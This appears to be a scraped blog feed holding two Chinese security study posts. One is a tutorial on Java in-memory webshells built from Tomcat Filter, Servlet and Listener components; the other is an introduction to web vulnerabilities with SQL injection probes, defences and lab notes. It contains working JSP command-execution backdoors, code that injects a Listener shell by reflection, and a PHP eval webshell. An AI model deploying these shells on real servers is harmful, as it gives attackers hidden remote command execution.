特征识别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的动态注册。\n2. 内存马分类： 3. Tomcat 基础 3.1 Tomcat 架构 3.1.1 Tomcat 架构 Tomcat 是Web应用服务器,是一个Servlet/JSP容器，基本框架如下图所示，主要有server、service、connector、container。\nServer：\n代表整个 Tomcat 服务器。\n一个 Tomcat 只有一个 Server，Server 中包含至少一个 Service 组件。\nService：\nService 主要是为了关联 Connector 和 Container，同时会初始化它下面的其它组件，在 Connector 和 Container 外面多包一层，把它们组装在一起，向外面提供服务，\n一个 Service 可以设置多个 Connector，但只能有一个 Container 容器。\nConnector：\nConnector 负责接收浏览器发过来的 tcp 连接请求，创建一个 Request 和 Response 对象分别用于和请求端交换数据，然后会产生一个线程来处理这个请求并把产生的 Request 和 Response 对象传给处理这个请求的线程。这里Tomcat中一个Connector对应了一个请求，所以service容器中可以同时有多个connector对象。\n简单来说就是Connector将在某个指定的端口上来监听客户的请求，将 socket 连接封装成 request 和 response 对象，后续交给 Container （Engine）来处理，并从Engine处获得响应并返回给客户端。\nConnector是使用protocolHandler来处理具体的请求（不同的protocolHandler代表不同的连接类型）。\n而每种protocolHandler都使用了各自的3个重要组件来具体处理请求：\n-Endpoint：用于处理底层Socket连接（nio和nio2实现的是TCP/IP协议，Apr实现的是SSL/TLS协议）；\n-Processer：用于将Endpoint接收到的Socket封装成Request（实现HTTP协议或websocket协议或AJP协议）；\n-Adapter：用于将封装好的Request交给Container（将请求适配到servlet容器）。\nContainer（又名Catalina）：\nContainer容器则是负责封装和管理Servlet 处理用户的servlet请求，并返回对象给web用户的模块。\nTomcat中有四种类型的Servlet容器，从上到下分别是 Engine、Host、Context、Wrapper。\nEngine：表示整个 Catalina 的 Servlet 引擎，用来管理多个虚拟站点，一个 Service 最多只能有一Engine，但是一个引擎可包含多个 Host；\nHost：代表一个虚拟主机，或者说一个站点，可以给 Tomcat 配置多个虚拟主机地址，而一个虚拟主机下可包含多个 Context；\nContext：表示一个 Web 应用程序，每一个Context都有唯一的path，一个Web应用可包含多个 Wrapper；\nWrapper：表示一个Servlet，负责管理整个 Servlet 的生命周期，包括装载、初始化、资源回收等\n3.1.2 Tomcat和Servlet的关系 Tomcat 是Web应用服务器，是一个Servlet/JSP容器，而Servlet容器从上到下分别是 Engine、Host、Context、Wrapper。\nEngine：实现类为 org.apache.catalina.core.StandardEngine\nHost：实现类为 org.apache.catalina.core.StandardHost\nContext：实现类为 org.apache.catalina.core.StandardContext\nWrapper：实现类为 org.apache.catalina.core.StandardWrapper\n在Tomcat中Wrapper代表一个独立的servlet实例，StandardWrapper是Wrapper接口的标准实现类（StandardWrapper 的主要任务就是载入Servlet类并且进行实例化），同时其从ContainerBase类继承过来，表示他是一个容器，只是他是最底层的容器，不能再含有任何的子容器了，且其父容器只能是context。而我们在也就是需要在这里去载入我们自定义的Servlet加载我们的内存马。\n3.1.3 Tomcat工作机制动画演示 3.2 Servlet 3.2.1 什么是servlet Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。\nservlet 架构：\n3.2.2 请求的处理过程 客户端发起一个http请求，比如get类型。\nServlet容器接收到请求，根据请求信息，封装成HttpServletRequest 和 HttpServletResponse对象。\nServlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。\nServlet容器调用service()方法。\nservice()方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。\ndoXXX方法中是我们自己写的业务逻辑。\n业务逻辑处理完成之后，返回给Servlet容器，然后容器将结果返回给客户端。\n容器关闭时候，会调用destory方法\n3.2.3 servlet生命周期 1）服务器启动时(web.xml中配置load-on-startup=1，默认为0)或者第一次请求该servlet时，就会初始化一个Servlet对象，也就是会执行初始化方法init(ServletConfig conf)。\n2）servlet对象去处理所有客户端请求，在service(ServletRequest req，ServletResponse res)方法中执行\n3）服务器关闭时，销毁这个servlet对象，执行destroy()方法。\n4）由JVM进行垃圾回收。\n3.3 Filter 3.3.1 简介 filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。\n3.3.2 基本工作原理 1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。\n2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。\n3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。\n4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。\n5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。\n6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。\n3.3.3 filter的生命周期 与servlet一样，Filter的创建和销毁也由web容器负责。web 应用程序启动时，web 服务器将创建Filter 的实例对象，并调用其init方法，读取web.xml配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter对象只会创建一次，init方法也只会执行一次）。开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象。 Filter对象创建后会驻留在内存，当web应用移除或服务器停止时才销毁。在Web容器卸载 Filter 对象之前被调用。该方法在Filter的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。\n3.3.4 filter链 当多个filter同时存在的时候，组成了filter链。web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter。当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法，通过判断FilterChain中是否还有filter决定后面是否还调用filter。\n3.4 Listener 3.4.1 简介 JavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。\nServletContextListener：对Servlet上下文的创建和销毁进行监听； ServletContextAttributeListener：监听Servlet上下文属性的添加、删除和替换；\nHttpSessionListener：对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效。\nHttpSessionAttributeListener：对Session对象中属性的添加、删除和替换进行监听；\nServletRequestListener：对请求对象的初始化和销毁进行监听； ServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听。\n在应用中可能调用的监听器如下：\nServletContextListener：用于监听整个 Servlet 上下文（创建、销毁） ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性） ServletRequestListener：对 Request 请求进行监听（创建、销毁） ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性） javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听 javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听 3.4.2 用途 可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。\n3.5 Tomcat内存马 Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。\n而这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。为了便于调试Tomcat，我们先在父项目的pom文件中引入Tomcat依赖\nxml\r1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-catalina\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;9.0.105\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 3.6 Tomcat 的管道机制 3.6.1 Tomcat中的管道机制 我们知道，当Tomcat接收到客户端请求时，首先会使用Connector进行解析，然后发送到Container进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。\n管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为Filter中的责任链机制\n在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。\n3.6.2 管道机制流程分析 我们先来看看Pipeline接口，其继承了Contained接口，并且实现了很多对 Valve 的操作方法\n跟进查看 Valve 接口：\n其中getNext()方法可以用来获取下一个Valve，Valve的调用过程可以理解成类似Filter中的责任链模式，按顺序调用。\n同时Valve可以通过重写invoke()方法来实现具体的业务逻辑\n下面我们通过源码看一看，消息在容器之间是如何传递的。首先消息传递到Connector被解析后，在org.apache.catalina.connector.CoyoteAdapter#service方法中\n前面是对Request和Respone对象进行一些判断及创建操作，我们重点来看一下\nconnector.getService().getContainer().getPipeline().getFirst().invoke(request, response)\n首先通过connector.getService()来获取一个StandardService对象\n接着通过StandardService.getContainer().getPipeline()获取StandardPipeline对象。\n再通过StandardPipeline.getFirst()获取第一个Valve\n最后通过调用StandardEngineValve.invoke()来实现Valve的各种业务逻辑\nhost.getPipeline().getFirst().invoke(request, response)实现调用后续的Valve。\n4. JSP 4.1 什么是 JSP： JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动println一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。\nJSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。\n当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。\n4.2 恶意类： JSP 的无回显的内存马： 最简单的 JSP 命令执行后门，但是命令执行的输出流（InputStream）未被读取或写回 HTTP 响应所以无回显。\njava\r1 \u0026lt;% Runtime.getRuntime().exec(request.getParameter(\u0026#34;cmd\u0026#34;));%\u0026gt; 改进为带回显：\njava\r1 2 3 4 5 6 7 8 9 \u0026lt;% String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); if (cmd != null) { InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\A\u0026#34;); String output = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; out.println(output); } %\u0026gt; 有回显的 Filter 木马： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.InputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Scanner\u0026#34; %\u0026gt; \u0026lt;%! public class ShellFilter implements Filter { public void destroy() { } public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException { HttpServletRequest req = (HttpServletRequest) request; HttpServletResponse resp = (HttpServletResponse) response; if (req.getParameter(\u0026#34;cmd\u0026#34;) != null) { boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, req.getParameter(\u0026#34;cmd\u0026#34;)} : new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, req.getParameter(\u0026#34;cmd\u0026#34;)}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\A\u0026#34;); String output = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; resp.getWriter().write(output); resp.getWriter().flush(); } chain.doFilter(request, response); } public void init(FilterConfig config) throws ServletException { } } %\u0026gt; 有回显的 Servlet 木马： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;%@ page import=\u0026#34;java.io.*\u0026#34; %\u0026gt; \u0026lt;%! public class MemServlet extends HttpServlet { private String message; public void init() { message = \u0026#34;Hello World!\u0026#34;; } // 计算机弹出 public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } public void destroy() { } // MemShell?cmd=whoami 任意命令执行 public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException { String cmd = req.getParameter(\u0026#34;cmd\u0026#34;); if (cmd !=null){ try{ Process process = Runtime.getRuntime().exec(cmd); InputStream inputStream = process.getInputStream(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream)); String line; while ((line = bufferedReader.readLine()) != null){ res.getWriter().println(line); } }catch (IOException e){ e.printStackTrace(); }catch (NullPointerException n){ n.printStackTrace(); } } } } %\u0026gt; 无回显的 Listener 木马： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.connector.Request\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%-- Created by IntelliJ IDEA. User: XVSHIFU Date: 2025/11/2 Time: 16:24 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;%! public class ShellListener implements ServletRequestListener { public void requestInitialized(ServletRequestEvent sre) { HttpServletRequest request = (HttpServletRequest) sre.getServletRequest(); String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); if (cmd != null) { try { Runtime.getRuntime().exec(cmd); } catch (IOException e) { e.printStackTrace(); } catch (NullPointerException n) { n.printStackTrace(); } } } public void requestDestroyed(ServletRequestEvent sre){ } } %\u0026gt; \u0026lt;% // 1. 获取 StandardContext 类 Field reqF = request.getClass().getDeclaredField(\u0026#34;request\u0026#34;); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext context = (StandardContext) req.getContext(); // 2. 添加监听器 ShellListener shellListener = new ShellListener(); context.addApplicationEventListener(shellListener); %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 5. Spring 基础 总结一句话：Spring就是一个轻量级的控制反转（IOC）和面向切面编程（AOP）的框架\n5.1 什么是Spring Spring是一个轻量级的Java开源框架，用于配置、管理和维护Bean（组件）的一种框架，其核心理念就是IoC(Inversion of Control,控制反转) 和 AOP(AspectOrientedProgramming， 面向切面编程)。现如今Spring全家桶已是一个庞大的家族\nSpring的出现大大简化了JavaEE的开发流程，减少了Java开发时各种繁琐的配置。\nSpring框架的核心之一就是分层，其由许多大大小小的组件构成，每种组件都实现不同功能。\n5.2 SpringBoot Spring Boot 基于 Spring 开发，Spirng Boot 本身并不提供 Spring 框架的核心特性以及扩展功能，只是用于快速、敏捷地开发新一代基于 Spring 框架的应用程序。也就是说，它并不是用来替代 Spring 的解决方案，而是和 Spring 框架紧密结合用于提升 Spring 开发者体验的工具。Spring Boot 以约定大于配置的核心思想，默认帮我们进行了很多设置，多数 Spring Boot 应用只需要很少的 Spring 配置。同时它集成了大量常用的第三方库配置（例如 Redis、MongoDB、Jpa、RabbitMQ、Quartz 等等），Spring Boot 应用中这些第三方库几乎可以零配置的开箱即用。\n简单来说就是SpringBoot其实不是什么新的框架，它默认配置了很多框架的使用方式，就像maven整合了所有的jar包，spring boot整合了所有的框架 。\nSpring Boot的主要优点：\n为所有Spring开发者更快的入门 开箱即用，提供各种默认配置来简化项目配置 内嵌式容器简化Web项目 没有冗余代码生成和XML配置的要求 6. java Agent 6.1 什么是Java Agent？ Java是一种静态强类型语言，在运行之前必须将其编译成.class字节码，然后再交给JVM处理运行。Java Agent 就是一种能在不影响正常编译的前提下，修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。\n对于Agent（代理）来讲，其大致可以分为两种，一种是在JVM启动前加载的premain-Agent，另一种是JVM启动之后加载的agentmain-Agent。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图\n参考： 【原创】利用“进程注入”实现无文件不死webshell\nJava安全学习——内存马 - 枫のBlog\nSpring内存马 | CurlySean’s Blog\nJava Agent实现反序列化注入内存shell\nJavaWeb 内存马一周目通关攻略 | 素十八\nJavaWeb 内存马二周目通关攻略 | 素十八\nShell中的幽灵王者—JAVAWEB 内存马 【认知篇】 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com\nJava内存马——Tomcat Valve型的三种注入 - FreeBuf网络安全行业门户\nJava 内存马（四）：Spring Boot Controller 内存马 | 渐怀的博客\nSpring型内存马分析\nServlet 简介 | 菜鸟教程\nSpring内存马学习\nSpring内存马——Controller/Interceptor构造\n[基础篇 - Javassist 使用指南](https://changeyourway.github.io/2024/06/07/Java 安全/基础篇-javassist用法指南/)\nJava安全学习——ROME反序列化 - 枫のBlog （使用Javassist缩短恶意class）\nJava Agent实现反序列化注入内存shell\nAgent内存马 | CurlySean’s Blog\n","permalink":"http://localhost:1313/xvsf/posts/java-%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%80%E7%AF%87---%E5%9F%BA%E7%A1%80/","summary":"\u003ch1 id=\"java-内存马第一篇---基础\"\u003eJava 内存马第一篇 - 基础\u003c/h1\u003e\n\u003ch1 id=\"一基础\"\u003e一、基础：\u003c/h1\u003e\n\u003ch2 id=\"1-什么是内存马\"\u003e1. 什么是内存马\u003c/h2\u003e\n\u003cp\u003e无文件的 webshell\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003c!-- raw HTML omitted --\u003e内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识\u003c!-- raw HTML omitted --\u003e\u003c!-- raw HTML omitted --\u003e别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的动态注册。\u003c!-- raw HTML omitted --\u003e\u003c/p\u003e","title":"Java 内存马第一篇 - 基础"},{"content":"初识漏洞 一、SQL注入漏洞 SQL注入实战指南-CSDN博客\nSQL注入攻击（SQL Injection）\nSQL注入原理：\nSQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。\nSQL注入点判断\n1.?id=1 and 1=1 和?id=1 and 1=2进行测试如果1=1页面显示正常和原页面一样，并且1=2页面报错或者页面部分数据显示不正常，那么可以确定此处为数字型注入。\nplain\r1 SELECT * FROM users WHERE id=1 and 1=2 2.?id=1' and 1=1--+/#和?id=1' and 1=2--+/#进行测试如果1=1页面显示正常和原页面一样，并且1=2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。\nplain\r1 SELECT * FROM users WHERE id=\u0026#39;1\u0026#39; and 1=2-- \u0026#39; 3.?id=1'and 1=1 and '1'='1和?id=1'and 1=1 and '1'='1进行测试如果1=1页面显示正常和原页面一样，并且1=2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。\nplain\r1 SELECT * FROM users WHERE id=\u0026#39;1\u0026#39; and 1=2 and \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; 4.?id=1%' and 1=1 and '%'='%和?id=1%' and 1=2 and '%'='%进行测试如果1=1页面显示正常和原页面一样，并且1=2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。\nplain\r1 SELECT * from table where users like \u0026#39;%1 %\u0026#39; and \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; and \u0026#39;%\u0026#39;=\u0026#39;%\u0026#39; 5.?id=1%' and 1=1--+/#和?id=1%' and 1=2--+/#进行测试如果1=1页面显示正常和原页面一样，并且1=2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。\n通常情况下，SQL注入的位置包括：\n（1）表单提交，主要是POST请求，也包括GET请求；\n（2）URL参数提交，主要为GET请求参数；\n（3）Cookie参数提交；\n（4）HTTP请求头部的一些可修改的值，比如Referer、User_Agent等；\n（5）一些边缘的输入点，比如.mp3文件的一些文件信息等。\n常见的防范方法\n（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。\n（2）对进入数据库的特殊字符（’”\u0026lt;\u0026gt;\u0026amp;*;等）进行转义处理，或编码转换。\n（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。\n（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。\n（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。\n（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。\n（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。\n（8）在网站发布之前建议使用一些专业的SQL注入检测工具进行检测，及时修补这些SQL注入漏洞。\n二、跨站脚本漏洞-XSS 跨站脚本攻击（Cross-site scripting，通常简称为XSS）发生在客户端，可被用于进行窃取隐私、钓鱼欺骗、窃取密码、传播恶意代码等攻击。\nXSS攻击使用到的技术主要为HTML和Javascript，也包括VBScript和ActionScript等。XSS攻击对WEB服务器虽无直接危害，但是它借助网站进行传播，使网站的使用用户受到攻击，导致网站用户帐号被窃取，从而对网站也产生了较严重的危害。\nXSS类型包括：\n（1）非持久型跨站：即反射型跨站脚本漏洞，是目前最普遍的跨站类型。跨站代码一般存在于链接中，请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码不存储到服务端（比如数据库中）。上面章节所举的例子就是这类情况。\n（2）持久型跨站：这是危害最直接的跨站类型，跨站代码存储于服务端（比如数据库中）。常见情况是某用户在论坛发贴，如果论坛没有过滤用户输入的Javascript代码数据，就会导致其他浏览此贴的用户的浏览器会执行发贴人所嵌入的Javascript代码。\n（3）DOM跨站（DOM XSS）：是一种发生在客户端DOM（Document Object Model文档对象模型）中的跨站漏洞，很大原因是因为客户端脚本处理逻辑导致的安全问题。\n常用的防止XSS技术包括：\n（1）与SQL注入防护的建议一样，假定所有输入都是可疑的，必须对所有输入中的script、iframe等字样进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。\n（2）不仅要验证数据的类型，还要验证其格式、长度、范围和内容。\n（3）不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。\n（4）对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。\n（5）在发布应用程序之前测试所有已知的威胁。\n三、弱口令漏洞 弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。\n设置密码通常遵循以下原则：\n（1）不使用空口令或系统缺省的口令，这些口令众所周之，为典型的弱口令。\n（2）口令长度不小于8个字符。\n（3）口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）。\n（4）口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符。\n（5）口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail地址等等与本人有关的信息，以及字典中的单词。\n（6）口令不应该为用数字或符号代替某些字母的单词。\n（7）口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入。\n（8）至少90天内更换一次口令，防止未被发现的入侵者继续使用该口令。\n四、HTTP报头追踪漏洞 HTTP/1.1（RFC2616）规范定义了HTTP TRACE方法，主要是用于客户端通过向Web服务器提交TRACE请求来进行测试或获得诊断信息。当Web服务器启用TRACE时，提交的请求头会在服务器响应的内容（Body）中完整的返回，其中HTTP头很可能包括Session Token、Cookies或其它认证信息。攻击者可以利用此漏洞来欺骗合法用户并得到他们的私人信息。该漏洞往往与其它方式配合来进行有效攻击，由于HTTP TRACE请求可以通过客户浏览器脚本发起（如XMLHttpRequest），并可以通过DOM接口来访问，因此很容易被攻击者利用。\n防御HTTP报头追踪漏洞的方法通常禁用HTTP TRACE方法。\n五、Struts2远程命令执行漏洞 ApacheStruts是一款建立Java web应用程序的开放源代码架构。Apache Struts存在一个输入过滤错误，如果遇到转换错误可被利用注入和执行任意Java代码。\n网站存在远程代码执行漏洞的大部分原因是由于网站采用了Apache Struts Xwork作为网站应用框架，由于该软件存在远程代码执高危漏洞，导致网站面临安全风险。CNVD处置过诸多此类漏洞，例如：“GPS车载卫星定位系统”网站存在远程命令执行漏洞(CNVD-2012-13934)；Aspcms留言本远程代码执行漏洞（CNVD-2012-11590）等。\n修复此类漏洞，只需到Apache官网升级Apache Struts到最新版本：http://struts.apache.org\n六、文件上传漏洞 文件上传漏洞通常由于网页代码中的文件上传路径变量过滤不严造成的，如果文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。\n因此，在开发网站及应用程序过程中，需严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关目录的执行权限，防范webshell攻击。\n七、私有IP地址泄露漏洞 IP地址是网络用户的重要标示，是攻击者进行攻击前需要了解的。获取的方法较多，攻击者也会因不同的网络情况采取不同的方法，如：在局域网内使用Ping指令，Ping对方在网络中的名称而获得IP；在Internet上使用IP版的QQ直接显示。最有效的办法是截获并分析对方的网络数据包。攻击者可以找到并直接通过软件解析截获后的数据包的IP包头信息，再根据这些信息了解具体的IP。\n针对最有效的“数据包分析方法”而言，就可以安装能够自动去掉发送数据包包头IP信息的一些软件。不过使用这些软件有些缺点，譬如：耗费资源严重，降低计算机性能；访问一些论坛或者网站时会受影响；不适合网吧用户使用等等。现在的个人用户采用最普及隐藏IP的方法应该是使用代理，由于使用代理服务器后，“转址服务”会对发送出去的数据包有所修改，致使“数据包分析”的方法失效。一些容易泄漏用户IP的网络软件(QQ、MSN、IE等)都支持使用代理方式连接Internet，特别是QQ使用“ezProxy”等代理软件连接后，IP版的QQ都无法显示该IP地址。虽然代理可以有效地隐藏用户IP，但攻击者亦可以绕过代理，查找到对方的真实IP地址，用户在何种情况下使用何种方法隐藏IP，也要因情况而论。\n八、未加密登录请求 由于Web配置不安全，登陆请求把诸如用户名和密码等敏感字段未加密进行传输，攻击者可以窃听网络以劫获这些敏感信息。建议进行例如SSH等的加密后再传输。\n九、敏感信息泄露漏洞 SQL注入、XSS、目录遍历、弱口令等均可导致敏感信息泄露，攻击者可以通过漏洞获得敏感信息。针对不同成因，防御方式不同\n十、CSRF http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html\n原理：利用用户认证状态执行非法请求。 防范：使用 Token 验证、Referer 验证等。 靶场练习 1、upload-labs 参考资料\n文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果.\n上传漏洞满足条件\n首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径。\n其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法得到Web容器解释这个脚本，那么也不能称之为漏洞。\n最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。\nphp一句话木马\nphp\r1 2 3 \u0026lt;?php @eval($_POST[1]); ?\u0026gt; 绕过方式 